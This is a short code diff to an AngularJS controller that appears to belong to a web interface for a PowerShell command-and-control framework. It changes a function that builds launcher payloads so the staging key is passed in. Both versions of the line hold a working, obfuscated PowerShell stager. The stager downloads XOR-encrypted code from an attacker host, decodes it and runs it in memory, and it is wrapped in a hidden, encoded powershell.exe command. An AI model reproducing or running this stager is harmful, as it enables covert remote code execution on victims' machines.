@@ -93,12 +93,12 @@ app.controller('main', ['$scope', function ($scope,$http)
     },1000);    
 
     // some functions
-    $scope.getLauncherPayload = function(listener,host)
+    $scope.getLauncherPayload = function(listener,host,staging_key)
     {
       console.log(listener+" is at "+host);
       $scope.currentListener=listener;
 
-      encoded = psEncode("[SySTeM.NET.SeRVicEPOintMAnageR]::ExPECt100COnTINue = 0;$wc=New-ObJEcT SySTEM.NeT.WEbCLIENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HeADERS.ADD('User-Agent',$u);$wC.PrOxy = [SYstEM.NEt.WebREQuesT]::DEfaulTWeBProxY;$wc.ProXy.CredeNTiAls = [SYsTEm.NeT.CReDenTIAlCACHe]::DefAUltNEtwOrKCredEnTiAls;$K='402acb1c3e3f37da6e1bb6cacadc315d';$I=0;[cHAr[]]$b=([char[]]($WC.DoWNLoadStRiNg(\""+host+"/index.asp\")))|%{$_-bXOR$K[$i++%$K.LENGth]};IEX ($B-JoIN'')");
+      encoded = psEncode("[SySTeM.NET.SeRVicEPOintMAnageR]::ExPECt100COnTINue = 0;$wc=New-ObJEcT SySTEM.NeT.WEbCLIENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HeADERS.ADD('User-Agent',$u);$wC.PrOxy = [SYstEM.NEt.WebREQuesT]::DEfaulTWeBProxY;$wc.ProXy.CredeNTiAls = [SYsTEm.NeT.CReDenTIAlCACHe]::DefAUltNEtwOrKCredEnTiAls;$K='"+staging_key+"';$I=0;[cHAr[]]$b=([char[]]($WC.DoWNLoadStRiNg(\""+host+"/index.asp\")))|%{$_-bXOR$K[$i++%$K.LENGth]};IEX ($B-JoIN'')");
 
       $scope.launcherPayload="powershell.exe -NoP -sta -NonI -W Hidden -Enc "+encoded;
 
